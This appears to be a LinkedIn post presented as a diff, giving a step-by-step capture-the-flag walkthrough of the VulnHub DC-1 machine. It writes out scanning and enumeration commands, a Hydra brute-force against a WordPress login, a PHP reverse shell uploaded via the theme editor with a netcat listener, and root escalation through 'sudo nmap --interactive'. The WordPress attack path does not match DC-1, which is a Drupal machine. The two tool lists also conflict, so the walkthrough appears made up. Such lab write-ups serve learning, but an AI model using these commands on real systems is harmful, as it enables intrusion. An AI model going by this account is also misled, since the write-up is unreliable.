@@ -1,0 +1,73 @@
+CTF Challenge:- Cracking The DC-1 Machine
+
+Hello, LinkedIn Network!
+
+On the 3-month 15-day journey of Cybersecurity. In the 17th task of ctf machine, this machine as compared to the other machine is less hard than the other machines.
+I am very excited to solve these machines, to understand & learn new machines.
+
+🛡️ DC-1 CTF Challenge | Capture The Flag Walkthrough 🛡️:-
+
+ 📍 Beginner-Friendly Boot2Root Machine
+ 🔒 Platform: VulnHub
+ 🔧 Difficulty: Easy-Medium
+ 🧰 Tools Used: Nmap, Gobuster, Nikto, Msfconsole, WordPress Exploits
+
+🔍 Challenge Overview:-
+
+The DC-1 machine is designed as a beginner-friendly vulnerable system aimed to sharpen web exploitation, enumeration, and privilege escalation skills. The goal: Capture the root flag by exploiting misconfigurations and weak credentials in a WordPress-based web app.
+
+🧰 Tools Used:-
+
+Nmap: Port scanning & service enumeration
+Gobuster: Directory brute-forcing
+Nikto: Vulnerability scanner
+Hydra: Brute-force credentials
+Netcat: Shell access
+WPScan: WordPress enumeration & user discovery
+Linux Privesc Check: Privilege escalation
+
+🧗‍♂️ My Walkthrough:-
+
+1)Nmap Scan:-
+nmap -sC -sV -oN dc1_nmap.txt 192.168.X.X
+➤ Found open ports: 80 (HTTP), 22 (SSH)
+
+2)Web Enumeration:-
+Accessed WordPress site on port 80
+Used Gobuster:
+gobuster dir -u http://192.168.X.X -w /usr/share/wordlists/dirb/common.txt
+➤ Found /wp-admin/, /wp-login.php, /license.txt
+
+3)WPScan for WordPress Users:-
+wpscan --url http://192.168.X.X --enumerate u
+➤ Discovered user: admin
+
+4)Brute-force Login using Hydra:-
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.X.X http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid"
+➤ Credentials found: admin:admin
+
+5)Gaining Shell Access:-
+Uploaded PHP reverse shell via WordPress theme editor
+Setup listener:
+nc -lvnp 4444
+Triggered reverse shell & gained limited shell access
+
+6)Privilege Escalation:-
+Checked sudo -l
+Found that user can run /usr/bin/nmap with sudo
+Escalated using interactive Nmap shell:
+sudo nmap --interactive
+!/bin/bash
+Got root shell ✅
+
+7)Captured the Flag:-
+cat /root/flag.txt
+
+🧠 Key Takeaways:-
+Enumeration is the key—never underestimate Gobuster and WPScan
+WordPress misconfigurations are common entry points
+Privilege escalation through misused sudo rights is a valuable technique
+Always check for interactive command opportunities in Linux binaries
+
+📌 Successfully rooted DC-1 🎯
+ 💬 Always eager to learn and explore more CTF challenges!
